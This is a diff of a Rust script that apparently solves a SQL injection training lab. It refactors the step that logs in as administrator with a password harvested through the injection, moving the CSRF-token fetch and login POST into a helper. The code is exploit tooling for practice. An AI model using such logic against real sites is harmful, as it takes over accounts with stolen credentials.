@@ -1,7 +1,7 @@
 use scraper::{Html, Selector};
 use sql_injection::{
-    HTTP_CLIENT, LOGIN_CSRF_TOKEN_SELECTOR, check_is_lab_solved, find_columns_of_type_string,
-    find_no_of_columns, generate_clap_parser, get_csrf_token,
+    HTTP_CLIENT, check_is_lab_solved, find_columns_of_type_string, find_no_of_columns,
+    generate_clap_parser, login_as_administrator,
 };
 use std::{collections::HashMap, sync::LazyLock};
 
@@ -78,45 +78,10 @@ fn main() {
         println!();
 
         if users_hashmap.contains_key("administrator") {
-            logger::info("Now logging in as administrator");
-            logger::info("Getting the login page CSRF TOKEN");
-
-            // Making a GET request to the login page
-            let response = HTTP_CLIENT
-                .get(format!("{lab_url}/login"))
-                .send()
-                .expect("[-] Failed to fetch the login page");
-
-            let login_page_csrf_token = get_csrf_token(
-                response
-                    .text()
-                    .expect("[-] Failed to extract login page body")
-                    .as_str(),
-                &LOGIN_CSRF_TOKEN_SELECTOR,
+            login_as_administrator(
+                lab_url,
+                users_hashmap.get("administrator").unwrap().to_string(),
             );
-
-            logger::success(format!("Login Page CSRF Token: {}", login_page_csrf_token).as_ref());
-            logger::info("Performing the login bypass");
-
-            if HTTP_CLIENT
-                .post(format!("{}/login", lab_url))
-                .form(&[
-                    ("csrf", login_page_csrf_token),
-                    ("username", "administrator".to_string()),
-                    (
-                        "password",
-                        users_hashmap.get("administrator").unwrap().to_string(),
-                    ),
-                ])
-                .send()
-                .expect("[-] Failed to login as administrator")
-                .status()
-                == 200
-            {
-                logger::success("Login succesfully as administrator");
-            } else {
-                logger::error("Failed to login as administrator");
-            }
         } else {
             panic!(
                 "{}",
